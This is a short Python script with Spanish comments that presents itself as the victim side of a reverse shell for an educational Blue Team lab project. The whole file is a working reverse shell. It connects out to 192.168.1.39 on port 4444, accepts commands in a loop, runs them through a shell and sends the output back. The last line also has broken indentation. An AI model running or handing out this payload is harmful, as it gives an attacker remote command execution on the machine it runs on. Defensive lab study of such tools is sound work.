#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# COMPATIBILIDAD: Windows + Linux
# =============================================================================


import socket, subprocess, sys 


def ejecutarComando(command):

    command_str = command.decode('utf-8', errors='ignore')

    return subprocess.check_output(command_str, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
connection.connect(("192.168.1.39", 4444)) 
connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8')) 


while True: 
    
    command = connection.recv(1024)

    try: 

        resultadosComando = ejecutarComando(command)

    except Exception as e:

        resultadosComando = str(e).encode('utf-8')
    
    connection.send(resultadosComando) 
  connection.close() 